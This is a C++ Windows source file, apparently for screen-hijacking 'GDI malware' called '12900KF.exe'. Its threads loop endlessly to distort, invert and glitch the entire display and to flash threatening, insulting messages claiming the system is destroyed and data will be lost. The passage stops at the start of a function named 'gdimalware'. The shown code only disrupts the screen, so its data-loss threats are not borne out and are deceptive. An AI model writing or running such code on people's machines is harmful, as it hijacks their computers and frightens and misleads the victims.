#include <windows.h>
#include <iostream>
#include <cmath>
#include <cstdlib>
#include <ctime>
#define _USE_MATH_DEFINES 1
#pragma comment(lib, "winmm.lib")

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;

typedef struct {
    double h;
    double s;
    double l;
} HSL;

typedef struct {
    BYTE rgbBlue;
    BYTE rgbGreen;
    BYTE rgbRed;
    BYTE rgbReserved;
} MY_RGBQUAD;

namespace Colors {
    double hueToRGB(double p, double q, double t) {
        if (t < 0) t += 1;
        if (t > 1) t -= 1;
        if (t < 1/6.0) return p + (q - p) * 6 * t;
        if (t < 1/2.0) return q;
        if (t < 2/3.0) return p + (q - p) * (2/3.0 - t) * 6;
        return p;
    }
    
    HSL rgb2hsl(RGBQUAD color) {
        HSL hsl;
        double r = color.rgbRed / 255.0;
        double g = color.rgbGreen / 255.0;
        double b = color.rgbBlue / 255.0;
        
        double max = fmax(fmax(r, g), b);
        double min = fmin(fmin(r, g), b);
        double delta = max - min;
        
        hsl.l = (max + min) / 2;
        
        if (delta == 0) {
            hsl.h = 0;
            hsl.s = 0;
        } else {
            hsl.s = hsl.l < 0.5 ? delta / (max + min) : delta / (2 - max - min);
            
            if (max == r)
                hsl.h = (g - b) / delta + (g < b ? 6 : 0);
            else if (max == g)
                hsl.h = (b - r) / delta + 2;
            else if (max == b)
                hsl.h = (r - g) / delta + 4;
            
            hsl.h /= 6;
        }
        
        return hsl;
    }
    
    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        double r, g, b;
        
        if (hsl.s == 0) {
            r = g = b = hsl.l;
        } else {
            double q = hsl.l < 0.5 ? hsl.l * (1 + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
            double p = 2 * hsl.l - q;
            
            r = hueToRGB(p, q, hsl.h + 1/3.0);
            g = hueToRGB(p, q, hsl.h);
            b = hueToRGB(p, q, hsl.h - 1/3.0);
        }
        
        rgb.rgbRed = (BYTE)(r * 255);
        rgb.rgbGreen = (BYTE)(g * 255);
        rgb.rgbBlue = (BYTE)(b * 255);
        rgb.rgbReserved = 0;
        
        return rgb;
    }
}
COLORREF Hue(int hue) {
    HSL hsl;
    hsl.h = hue / 360.0;
    hsl.s = 1.0;
    hsl.l = 0.5;
    RGBQUAD rgb = Colors::hsl2rgb(hsl);
    return RGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue);
}

DWORD WINAPI shader1(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)(x & y) * i;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI shader2(LPVOID lpParam) {
    HDC hdc;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0); 
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 30; i++) {
            StretchBlt(hdcMem, rand() % 10, rand() % 10, sw - 20, sh - 20, hdcMem, 0, 0, sw, sh, SRCCOPY);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
        ReleaseDC(0, hdc);
        DeleteObject(screenshot); 
        DeleteDC(hdcMem); 
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader4(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = 239 + i;
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

DWORD WINAPI thing5(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        int inc3 = rand() % 700;
        int v = rand() % 2;
        if (v == 1) inc3 = -700;
        inc3++;
        pt[0].x = rect.left - inc3;
        pt[0].y = rect.top + inc3;
        pt[1].x = rect.right - inc3;
        pt[1].y = rect.top - inc3;
        pt[2].x = rect.left + inc3;
        pt[2].y = rect.bottom - inc3;
        PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
        DeleteObject(hdcMem); DeleteObject(bm);
        Sleep(1);
    }
}

DWORD WINAPI cubes(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        StretchBlt(hdc, -10, -10, x + 20, y + 20, hdc, 0, 0, x, y, SRCCOPY);
        StretchBlt(hdc, 10, 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Verity(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += x;
			rgbScreen[i].g += y;
			rgbScreen[i].b += x;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI textouts(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "R.I.P YOUR COMPUTER!";
		text1 = "SYSTEM DESTROYED!";
		text2 = "THIS IS THE END OF YOUR PC!";
		text3 = "YOUR DATA WILL BE LOST!";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_EXTRALIGHT, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Engravers MT");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI textouts1(LPVOID lpvd)
{
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    while(1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        text = "12900KF.exe";
        text1 = "R.I.P TO THE PERSON IN FRONT OF THE SCREEN!";
        text2 = "WHAT WERE YOU THINK?!"; // credits to N17Pro3426 for this text
        text3 = "ARE YOU STUPID?!";
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader5(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
	bmi.bmiHeader.biWidth = sw;
	bmi.bmiHeader.biHeight = sh;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	RGBTRIPLE* rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed = x & y;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, +25, SRCCOPY);
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, -sh+25, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr);
	}
}

DWORD WINAPI Verityy(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    RGBQUAD* rgbScreen = NULL;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgbRed *= rand();
            rgbScreen[i].rgbGreen *= rand();
            rgbScreen[i].rgbBlue *= rand();
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(10);
        ReleaseDC(NULL, hdcScreen); 
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI pacmans(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI Geometrydashh(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)(x - y) * i;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI dwnm(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, nullptr, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = x & y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI i912900(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt((double)(x + y)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI jhjhh(LPVOID lpParam) {
    DWORD startTime = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    srand((unsigned int)time(NULL));
    while (1) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - startTime) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            INT x = i % w, y = i / w;
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) += x ^ y;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI dfgvfh(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) ^ (y * i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

DWORD WINAPI textouts2(LPVOID lpvd) {
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    const char* messages[] = {
        "12900KF.exe",
        "GOODBYE THIS USER!",
        "12900KF.EXE HAS BEEN DESTROYED YOUR DUMB PC!",
        "12900KF!",
        "R.I.P THIS WINDOWS USER!",
        "THE CREATOR WON'T BE RESPONSIBLE FOR ANY OF THE DAMAGE CAUSED!",
    };
    
    while (1) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        for (int i = 0; i < 6; i++) {
            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            TextOutA(hdc, rand() % x, rand() % y, messages[i], strlen(messages[i]));
            Sleep(10);
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI dsfv(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) ^ (y + i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

DWORD WINAPI IntelCorei912900(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                double fractalX = (2.5f / w);
                double fractalY = (1.90f / h);
                double cx = x * fractalX - 2.f;
                double cy = y * fractalY - 0.95f;
                double zx = 0;
                double zy = 0;
                int fx = 0;
                while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                    double fczx = zx * zx - zy * zy + cx;
                    double fczy = 2 * zx * zy + cy;
                    zx = fczx;
                    zy = fczy;
                    fx++;
                    rgbquadCopy = rgbquad[index];
                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                    hslcolor.s = 0.7f;
                    hslcolor.l = 0.5f;
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI Verityisheree(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Verity is here!";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI sfvdhvhsv(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = rand()%0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI setpixel(LPVOID lpParam) {
    int y = GetSystemMetrics(SM_CYSCREEN);
    int x = GetSystemMetrics(SM_CXSCREEN);
    int yfull = GetSystemMetrics(SM_CYFULLSCREEN);
    int xfull = GetSystemMetrics(SM_CXFULLSCREEN);
    int rainbow = x - rand() % x - (x / 150 - 112) % 149;
    int inc = round(x / 100);
    round(y / 1);
    round(yfull / 100);
    round(xfull / 10);
    while (1) {
        HDC hdc = GetDC(0);
        for (int yp = 0; yp < y; ++yp) {
            for (int xp = 0; xp < x; ++xp) {
                int xa = inc * xp;
                SetPixel(hdc, xp, yp, RGB(xa, xa, xa));
                SetPixel(hdc, yp, rainbow, RGB(yfull, xa, xfull));
                SetPixel(hdc, rainbow, rainbow, RGB(rainbow, rainbow, rainbow));
                SetPixel(hdc, rainbow, yp, RGB(xfull, yfull, xfull));
            }
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Verityishere(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    LPCWSTR lpText = L"Verity is here!";
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, top_x, top_y, lpText, wcslen(lpText));
        if (y == GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x == GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI gdimalware(LPVOID lParam) {
